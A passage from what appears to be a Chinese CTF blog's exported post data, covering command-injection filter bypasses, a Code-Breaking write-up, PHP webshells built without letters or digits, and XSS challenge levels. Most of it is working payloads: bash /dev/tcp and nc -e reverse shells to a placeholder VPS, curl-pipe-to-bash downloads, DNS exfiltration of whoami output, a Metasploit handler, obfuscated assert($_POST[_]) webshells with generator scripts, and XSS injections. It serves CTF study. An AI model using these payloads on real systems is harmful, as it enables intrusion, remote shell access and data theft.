&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 || 表示上一条命令执行失败后，才执行下一条命令 命令终止符 %00%20# 查找未被过滤字符123456789101112131415161718&lt;?php$cmd='0a|09|ls|rm|sleep|sh|base|bash|grep|nc|ping|curl|cat|tac|od|more|less|dir|cut|nl|vi|unique|head|tail|sort|rev|string|find|$|(|)|[|]|&#123;|&#125;|&gt;|&lt;|?|\\'|\"|*|;|\\||&amp;|/|^|+|\\\\\\\\';$filter='| |_|php|;|~|\\\\^|\\\\+|eval|cat|tac|rev|nl|head|tail|sort|&#123;|&#125;';#替换此文件function check($filter,$input)&#123; #print($input); if(!stripos($filter,$input))&#123; // if(preg_match(\"/'| |_|=|php/\",$input))&#123; echo $input; echo \"\\n\"; &#125;&#125;$cmds=explode('|', $cmd);foreach ($cmds as $value) &#123; check($filter,$value); &#125; 绕过escapeshellcmdescapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\\）会在以下字符之前插入： &amp;#;|*?~&lt;&gt;^()[]{}$, \\x0A 和 \\xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于 法一：win下执行bat1234567&lt;?php$command = 'dir '.$_POST['dir'];$escaped_command = escapeshellcmd($command);var_dump($escaped_command);file_put_contents('out.bat',$escaped_command);system('out.bat');?&gt; 执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。payload: 1dir&#x3D;..&#x2F; %1a whoami 法二：宽字节注入php5.2.5及之前可以通过输入多字节来绕过。现在几乎见不到了。 1escapeshellcmd(&quot;echo &quot;.chr(0xc0).&quot;;id&quot;); 之后该语句会变成 1echo 繺;id 从而实现 id 命令的注入。 空格过滤法一： ${IFS}$IFS在linux下表示分隔符，然而我本地实验却会发生这种情况，这里解释一下,单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用$9呢，因为$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串。 payload1: 1234ubuntu@VM-207-93-ubuntu:~$ cat flagnice dayubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;flagnice day payload2: 12ubuntu@VM-207-93-ubuntu:~$ cat$&#123;IFS&#125;$9flagnice day payload3: 12ubuntu@VM-207-93-ubuntu:~$ cat$IFS$9flagnice day 法二： 重定向符&lt;&gt;payload1： 12ubuntu@VM-207-93-ubuntu:~$ cat&lt;&gt;flagnice day payload2： 12ubuntu@VM-207-93-ubuntu:~$ cat&lt;flagnice day 黑名单绕过法一： 拼接12ubuntu@VM-207-93-ubuntu:~$ a&#x3D;c;b&#x3D;at;c&#x3D;flag;$a$b $cnice day 法二： 利用已存在的资源从已有的文件或者环境变量中获得相应的字符。 法三： base64编码payload1: 12ubuntu@VM-207-93-ubuntu:~$ &#96;echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d&#96;nice day payload2: 12ubuntu@VM-207-93-ubuntu:~$ echo &quot;Y2F0IGZsYWc&#x3D;&quot;|base64 -d|bashnice day 法四： 单引号、双引号payload1: 12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at flagnice day payload2: 12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&quot;&quot;agnice day payload3: 12ubuntu@VM-207-93-ubuntu:~$ c&quot;&quot;at fl&#39;&#39;agnice day 法五：反斜线 \\payload: 12ubuntu@VM-207-93-ubuntu:~$ c\\at fl\\agnice day 无回显第一种是利用bash命令并在本地进行nc监听结果查看回连日志先在vps处用nc进行监听 1nc -l -p 8080 -vvv 然后在靶机命令执行处输入 1|bash -i &gt;&amp; /dev/tcp/xxxxxI(你的vps的公网ip)/8080 0&gt;&amp;1 第二种是msf反向回连 同样vps用msf监听 vps的msf监听： 123456use exploit/multi/handlerset payload linux/armle/shell/reverse_tcpset lport 8080set lhost xxx.xxx.xxx.xxxset exitonsession falseexploit -j 然后在靶机命令执行处输入 1|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxxxxI(你的vps的公网ip)&#x2F;8080 0&gt;&amp;1 第三种是利用DNS管道解析 1|curl `whoami`.xxxx.xxx(子域名) `反引号在linux下是执行命令的特殊符号 0x05 长度限制12345&lt;?phpif(strlen($_GET[test])&lt;8)&#123;echo shell_exec($_GET[test]);&#125;?&gt; 长度限制文件构造 12345&lt;?phpif(strlen($_GET[test])&lt;8)&#123;echo shell_exec($_GET[test]);&#125;?&gt; payload: 1234567891&gt;wget\\1&gt;域名.\\1&gt;com\\1&gt;-O\\1&gt;she\\1&gt;ll.p\\1&gt;pls&gt;ash a 将会创建一个名字为wget的空文件。payload1会报错，payload2不会报错。.这里注意.不能作为文件名的开头，因为linux下.是隐藏文件的开头，ls列不出来 然而这里还有个问题，就是ls下的文件名是按照字母顺序排序的，所以需要基于时间排序 1ls -t&gt;a LINUX下一些已有字符 ${PS2} 对应字符 ‘&gt;’ ${PS4} 对应字符 ‘+’ ${IFS} 对应 内部字段分隔符 ${9} 对应 空字符串 工具 shelling 例题GCTF RCE这题过滤了很多东西,下面说一下比较重要的 1||&amp;|;|%&#123;&#125;| |''|.| 这里给个payload 123%0acat%09%0Acat$IFS$9%0acat&lt; [BJDCTF 2nd]duangShellvim编辑一个文件产生的临时文件，处理不当有可能造成泄露。其泄露方式为文件名.swp 有些时候文件名前会有一个点.。然后获得这个.swp文件后，在Linux里通过命令 vim -r xxx.swp 来让临时文件恢复正常 12345678910111213141516171819&lt;?phperror_reporting(0);echo \"how can i give you source code? .swp?!\".\"&lt;br&gt;\";if (!isset($_POST['girl_friend'])) &#123; die(\"where is P3rh4ps's girl friend ???\");&#125;else &#123; $girl = $_POST['girl_friend']; if (preg_match('/\\&gt;|\\\\\\/', $girl)) die('just girl'); else if (preg_match('/ls|phpinfo|cat|\\%|\\^|\\~|base64|xxd|echo|\\$/i', $girl)) &#123; echo \"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;\"; &#125; else &#123; exec($girl); //duangShell~~~~ &#125; &#125;?&gt; 本题的RCE绕过poc1：通过 curl url获得某个网址的某个文件的内容，再通过管道符转移给bash处理,如:curl url/shell.txt|bash shell.txt里是要执行的命令，本题建议在shell.txt里放反弹shell指令poc2:监听命令攻击机 1nc -lvvp port 靶机上执行 1nc vpsip port -e &#x2F;bin&#x2F;bash 用find / -name flag 寻找flag 某题12345678910&lt;?phphighlight_file(__FILE__);$filter = '/#|`| |[\\x0a]|ls|rm|sleep|sh|bash|grep|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\\$|\\(\\|\\)|\\[|\\]|\\&#123;|\\&#125;|\\&gt;|\\&lt;|\\?|\\'|\"|\\*|;|\\||&amp;|\\/|\\\\\\\\/is';$cmd = $_POST['cmd'];if(!preg_match($filter, $cmd))&#123; system($cmd.\"echo 'hi~'\");&#125;else&#123; die(\"???\");&#125;?&gt; 没过滤dir和cut 1cmd=dir%09.%09 cut 1cmd=cut%09-f%091%09CvvD_F14g_1s_h4rehaha.php%09 安网杯某题123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|cat|tac|rev|nl|head|tail|sort|&#123;|&#125;/i\",$input))&#123; // if(preg_match(\"/'| |_|=|php/\",$input))&#123; die('hacker!!!'); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = 'sb/' . md5($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET[\"action\"] ?? \"\") &#123; case 'pwd': echo $dir; break; case 'upload': $data = $_GET[\"data\"] ?? \"\"; waf($data); file_put_contents(\"$dir\" . \"index.php\", $data);&#125;?&gt; payload 1/?action=upload&amp;data=&lt;?=`more\\$IFS\\$9../../../../../../fl*\\$IFS\\$9/1`?&gt; 参考文章:浅谈CTF中命令执行与绕过的小技巧命令执行的一些绕过技巧","categories":[{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/categories/ctf/"}],"tags":[{"name":"命令执行","slug":"命令执行","permalink":"https://blog.cfyqy.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/tags/ctf/"}],"author":"ye1s"},{"title":"CODEBREAKING_writeup","slug":"CODEBREAKING-writeup","date":"2020-07-03T14:36:00.000Z","updated":"2020-07-06T14:22:01.347Z","comments":true,"path":"article/a0676cde.html","link":"","permalink":"https://blog.cfyqy.com/article/a0676cde.html","excerpt":"网址：https://code-breaking.com/","text":"网址：https://code-breaking.com/ easy - function12345678910&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123; show_source(__FILE__);&#125; else &#123; $action('', $arg);&#125; 因为正则里用了^$，那么有没有可能在开头或结尾加入某个字符来绕过正则且函数依然能调用呢？这里跑一遍0-128的ascii码，可以得到 code-breaking puzzles第一题，function，为什么函数前面可以加一个%5c？其实简单的不行，php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 PHP create_function代码注入 函数结构形似 12345create_function('$a,$b','return 111')==&gt;function a($a, $b)&#123; return 111;&#125; 然后执行，如果我们想要执行任意代码，就首先需要跳出这个函数定义。 12345create_function('$a,$b','return 111;&#125;phpinfo();//')==&gt;function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; easy pcrewaf1234567891011121314151617181920&lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo \"bad request\";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header(\"Location: $path\", true, 303);&#125; Code Breaking 挑战赛 WriteupPHP create_function代码注入","categories":[{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://blog.cfyqy.com/tags/ctf/"}],"author":"ye1s"},{"title":"php无数字字母webshell","slug":"php无数字字母webshell","date":"2020-07-02T16:40:07.000Z","updated":"2021-05-13T13:00:05.924Z","comments":true,"path":"article/3317f635.html","link":"","permalink":"https://blog.cfyqy.com/article/3317f635.html","excerpt":"遇到无数字和字母绕过的题目，总是有点懵，赶紧学习一下。","text":"遇到无数字和字母绕过的题目，总是有点懵，赶紧学习一下。 基本概念异或1234&lt;?phpecho \"N\"^\"!\";?&gt;运行结果: o 输出的结果是字符”o”，这是因为代码对字符”N”和字符”!”进行了异或操作。在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。例如: 123456789101112&lt;?php @$_++; // $_ = 1 $__=(\"#\"^\"|\"); // $__ = _ $__.=(\".\"^\"~\"); // _P $__.=(\"/\"^\"`\"); // _PO $__.=(\"|\"^\"/\"); // _POS $__.=(\"&#123;\"^\"/\"); // _POST $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;甚至可以将上面的代码合并为一行，从而使程序的可读性更差:$__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"&#123;\"^\"/\"); 取反先了解一下 二进制的最高位是符号位，0表示正数，1表示负数。 正数的原码，反码，补码都一样。 负数的反码=它的原码符号位不变，其它位取反(0-&gt;1,1-&gt;0)。 负数的补码=它的反码+1。 0的反码，补码都是0. php没有无符号数，换言之，php中的数都是有符号的。 在计算机运算的时候，都是以补码的方式来运算的，那么运算完后得到的结果也是某个数的补码 例子： 1234&lt;?php echo ~8；?&gt; 运行结果：-9 -9的由来 8的原码、反码、补码都是 ： 100000000 00000000 00000000 00001000 取反(即~8)后得到： 111111111 11111111 11111111 11110111 &#x2F;&#x2F;第一位是符号位，1代表负号，表示这是一个负数；记住运算和运算结果都是用补码表示的，这是某个数的补码，我们还需要推导反码和原码 反码=补码-1，即： 111111111 11111111 11111111 11110110 原码(符号位不变，其他位取反)： 110000000 00000000 00000000 00001001 所以结果是：-9 php 12345&lt;?phpecho urlencode(~'phpinfo');?&gt;result: 0x8f0x970x8f0x960x910x990x90 python 123456def get(shell): hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit)get('phpinfo')result: 0x8f0x970x8f0x960x910x990x90 自增这种方法很明显的缺点就是需要大量的字符 1'a'++ =&gt; 'b'，'b'++ =&gt; 'c' &#39;a&#39;++ =&gt; &#39;b&#39;，&#39;b&#39;++ =&gt; &#39;c&#39;，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。 PHP是弱类型的语言，也就是说在PHP中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于PHP弱类型的这个特点，我们对PHP的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理。 利用了PHP弱类型特性，true的值为1，故true+true==2。 12345$_=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')print($_)print($_/$_)结果会输出：2 1 在php中未定义的变量默认值为null，null==false==0，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。 123456&lt;?php$_++;print($_);?&gt;结果会输出：1 通配符12/a=',`/???/?a?%20??a?????`,' /?a='?:`/???/?a?%20??a?????`?:' 例题无数字字母一些不包含数字和字母的webshell 1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 三种解法: 1.异或找到两个非数字和字母的字符，异或的结果为我们想要的字符串如下： 123456&lt;?php$_=('%01'^'`').('%08'^'&#123;').('%08'^'&#123;').('%05'^'`').('%09'^'&#123;').('%08'^'|'); // $_='assert';$__='_'.('%0B'^'[').('%0F'^'@').('%08'^'[').('%09'^']'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; 脚本如下： 1234567891011121314151617181920212223242526272829303132333435from urllib import parsedef get_xor(string): result='' for i in string: flag = 0 # 判断是否有找到符合条件的 for j in range(127): if word_filter(j): continue if flag: break for k in range(127): if word_filter(k): continue if j^k==ord(i): result+=\"('&#123;0&#125;'^'&#123;1&#125;').\".format(is_urlencode(j),is_urlencode(k)) flag=1 break print(result[0:len(result)-1])#判断是否是字母和数字def word_filter(num): word=chr(num) if word.isdigit() or word.isalpha() or word==\"\\\\\": return True return False#对不可打印字符进行url编码def is_urlencode(num): if num&lt;32: return parse.quote(chr(num)) else: return chr(num)get_xor(\"assert\")get_xor(\"POST\") 2.取反 12345678910111213&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___=\"实\";$____.=~($___&#123;$__&#125;);$___=\"二\";$____.=~($___&#123;$__&#125;);$___=\"二\";$____.=~($___&#123;$__&#125;);$___=\"的\";$____.=~($___&#123;$_&#125;);$___=\"不\";$____.=~($___&#123;$__&#125;);$___=\"事\";$____.=~($___&#123;$__&#125;);$_____='_';$___=\"说\";$_____.=~($___&#123;$_&#125;);$___=\"记\";$_____.=~($___&#123;$__&#125;);$___=\"笔\";$_____.=~($___&#123;$_&#125;);$___=\"快\";$_____.=~($___&#123;$__&#125;);$_=$$_____;$____($_[$__]);?&gt; 这里需要注意的是+在url是空格，直接写会导致报错，要url变码为%2b。 payload生成的脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//得到一些汉字function getCChar()&#123; $url=\"https://www.zuozuovera.com/archives/787/\"; $html=file_get_contents($url); //print($html); return $html;&#125;//寻找汉字中跟字母相等function getNegate($s,$t)&#123; $arr=array(1=&gt;'$_',2=&gt;'$__'); for($i=1;$i&lt;strlen($s);$i++)&#123; if(~($s&#123;$i&#125;)===$t)&#123; return sprintf('$___=\"%s\";$____.=~($___&#123;%s&#125;);',$s,$arr[$i]); &#125; &#125; return \"1\";&#125;// /u表示把字符串当作utf-8处理，并把字符串开始和结束之前所有的字符串分割成数组function mb_str_split( $string ) &#123; return preg_split('/(?&lt;!^)(?!$)/u', $string );&#125;function getPayload($string)&#123; $result=''; $cchar=getCChar(); for($i=0;$i&lt;strlen($string);$i++) &#123; foreach(mb_str_split($cchar) as $c)&#123; $word=getNegate($c,$string[$i]); if($word!=\"1\")&#123; $result.=$word; break; &#125; &#125; &#125; print($result); print(\"\\n\");&#125;getPayload(\"assert\");getPayload(\"POST\");?&gt; 3.自增 组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array： 1234&lt;?phpecho ''.[];?&gt;result:Array 再取这个字符串的第一个字母，就可以获得’A’了。 因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])，无需获取小写a 1234567891011121314151617181920212223242526272829303132333435&lt;?php$_=[];$_=@\"$_\"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); 长度限制无数字字母12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;40)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9]+/\",$code))&#123; die(\"NO.\"); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = \"php function getFlag() to get flag\";?&gt; 1.异或要求code的长度不能大于40，限制输入不能为字母和数字。可以利用 PHP允许动态函数执行的特点，拼接出一个函数名getFlag()，然后动态执行即可。 这里依然可以用异或的方法，只是上面写出来的字符长度太长了。需要用简短的写法：payload 12345?code=$_=\"`&#123;&#123;&#123;\"^\"?&lt;&gt;/\";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag这里的\"`&#123;&#123;&#123;\"^\"?&lt;&gt;/\"上面已经说过了是异或的简短写法，表示_GET。$&#123;$_&#125;[_]($&#123;$_&#125;[__]);等于$_GET[_]($_GET[__]);把_当作参数传进去执行getFlag() 1.取反 1234&lt;?phpecho urlencode(~'getFlag');?&gt; result:%98%9A%8B%B9%93%9E%98 payload 1?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); 或者 12345678&lt;?php$a='assert';echo urlencode(~$a).\"\\n\";$b='(eval($_POST[y]))';echo urlencode(~$b).\"\\n\";#%9E%8C%8C%9A%8D%8B#%D7%9A%89%9E%93%D7%A0%AF%B0%AC%AB%A4%86%A2%D6%D6?&gt; 一句话 12?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%86%A2%D6%D6);密码：y assert是函数，eval不是函数，是一种语言构造器，eval($a)中$a只能是字符串，assert($a)中$a可以是php代码，也可以是php代码的字符串。assert($a)的$a如果是字符串形式不能有2个以上的分号,如果有2个以上的分号只执行到第一个，使用assert来执行多条php语句可借助eval来实现。例如像下面这个样子： 1assert(eval(\"echo 1;echo 2;\")); 长度限制无数字字母下划线无字母数字webshell之提高篇 12345678910111213&lt;?phpif(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die(\"Long.\"); &#125; if(preg_match(\"/[A-Za-z0-9_$]+/\",$code))&#123; die(\"NO.\"); &#125; eval($code);&#125;else&#123; highlight_file(__FILE__);&#125; 前面文章中给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为$不能使用了，所以我们无法构造PHP中的变量。 php7php7中修改了表达式执行的顺序：http://php.net/manual/zh/migration70.incompatible.php PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）： 1(~%8F%97%8F%96%91%99%90)(); php5 使用“反引号”+“shell”的方式来getshell shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替 .或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。 glob通配符 12*可以代替0个及以上任意字符?可以代表1个任意字符 例如:/tmp/phpXXXXXX就可以表示为/*/?????????或/???/????????? 更多glob内容可看 https://man7.org/linux/man-pages/man7/glob.7.html glob支持用[^x]的方法来构造“这个位置不是字符x” glob支持利用[0-9]来表示一个范围 1ls &#x2F;???&#x2F;?????????[@-[]] [津门杯] hatephpphp5.6无法使用反转，使用通配符即可 1234567891011&lt;?phperror_reporting(0);if(!isset($_GET['code']))&#123; highlight_file(__FILE__);&#125;else&#123; $code = $_GET['code']; if(preg_match(\"/[A-Za-z0-9_$@]+/\",$code))&#123; die('fighting!'); &#125; eval($code);&#125; payload 1?code=?&gt;&lt;?=`/???/??? /????`?&gt; 匹配 /bin/cat /flag [SUCTF 2018]GetShell12345678if($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"]))&#123; $data=substr($contents,5); foreach ($black_char as $b) &#123; if (stripos($data, $b) !== false)&#123; die(\"illegal char\"); &#125; &#125; &#125; 脚本判断过滤了什么 12345678910111213141516171819202122232425262728293031323334353637383940414243import requestsdef ascii_str(): str_list = [] for i in range(33, 127): str_list.append(chr(i)) # print('可显示字符：%s'%str_list) return str_listdef upload_post(url): str_list = ascii_str() for str in str_list: header = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'multipart/form-data; boundary=---------------------------339469688437537919752303518127' &#125; post = '''-----------------------------339469688437537919752303518127Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"Content-Type: text/plain12345''' + str + '''-----------------------------339469688437537919752303518127Content-Disposition: form-data; name=\"submit\"提交 -----------------------------339469688437537919752303518127--''' res = requests.post(url, data=post.encode('UTF-8'), headers=header) if 'Stored' in res.text: print(\"该字符可以通过: &#123;0&#125;\".format(str)) else: pass # print(\"过滤字符: &#123;0&#125;\".format(str))if __name__ == '__main__': url = 'http://cd8eed3c-602b-450c-9b0d-21e6b21d30f4.node3.buuoj.cn/index.php?act=upload' upload_post(url) 只有$ () . ;=[] ~可以使用,再配合汉字， 123456789101112131415161718192021222324&lt;?php$__=[];$_=($__==$__);$__=~(融);$___=$__[$_];$__=~(匆);$___.=$__[$_].$__[$_];$__=~(随);$___.=$__[$_];$__=~(千);$___.=$__[$_];$__=~(苦);$___.=$__[$_];$____=~(~(_));$__=~(诗);$____.=$__[$_];$__=~(尘);$____.=$__[$_];$__=~(欣);$____.=$__[$_];$__=~(站);$____.=$__[$_];$_=$$____;$___($_[_]); 参考文章:PHP关于按位取反结果的推导过程PHP不使用数字,字母和下划线写shell一些不包含数字和字母的webshell浅谈无字母数字构造webshell无字母数字webshell之提高篇","categories":[],"tags":[],"author":"ye1s"},{"title":"XSS闯关小游戏","slug":"XSS闯关小游戏","date":"2020-06-21T02:14:00.000Z","updated":"2020-06-26T03:35:54.236Z","comments":true,"path":"article/a2cd5ed4.html","link":"","permalink":"https://blog.cfyqy.com/article/a2cd5ed4.html","excerpt":"一个XSS小游戏闯关平台","text":"一个XSS小游戏闯关平台 level112345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;script&gt;window.alert = function() &#123; confirm(\"完成的不错！\"); window.location.href=\"level2.php?keyword=test\"; &#125;&lt;/script&gt;&lt;title&gt;欢迎来到level1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"name\"];echo \"&lt;h2 align=center&gt;欢迎用户\".$str.\"&lt;/h2&gt;\";?&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;&lt;?php echo \"&lt;h3 align=center&gt;payload的长度:\".strlen($str).\"&lt;/h3&gt;\";?&gt;&lt;/body&gt;&lt;/html&gt; answer: 1/level1.php?name=&lt;script&gt;alert(1);&lt;/script&gt; level212345678910&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=\"'.$str.'\"&gt;&lt;input type=submit name=submit value=\"搜索\"/&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; answer:使用js的事件 11\" onclick=alert(1) \" 将input的文本框本分提前闭合 1\"&gt;&lt;script&gt;alert(1)&lt;/script&gt; level312345678910&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".\"&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value='\".htmlspecialchars($str).\"'&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;\";?&gt; tips:htmlspecialchars(string,flags)对如下的特殊字符进行转换,flags默认为ENT_COMPAT|ENT_HTML401,默认不转换单引号。 字符 替换后 &amp; (&amp; 符号) &amp;amp; “ (双引号) &amp;quot;，除非设置了 ENT_NOQUOTES ‘ (单引号) &amp;#039; 或者 &amp;apos; &lt; (小于) &amp;lt; &gt; (大于) &amp;gt; answer:js事件 1' onclick=alert(1) ' level4123456789101112&lt;?php ini_set(\"display_errors\", 0);$str = $_GET[\"keyword\"];$str2=str_replace(\"&gt;\",\"\",$str);$str3=str_replace(\"&lt;\",\"\",$str2);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=\"'.$str3.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; answer: 1\" onfocus=alert(1) autofocus=\" level5123456789101112&lt;?php ini_set(\"display_errors\", 0);$str = strtolower($_GET[\"keyword\"]);$str2=str_replace(\"&lt;script\",\"&lt;scr_ipt\",$str);$str3=str_replace(\"on\",\"o_n\",$str2);echo \"&lt;h2 align=center&gt;没有找到和\".htmlspecialchars($str).\"相关的结果.&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=\"'.$str3.'\"&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;';?&gt; tips:javascript:URL 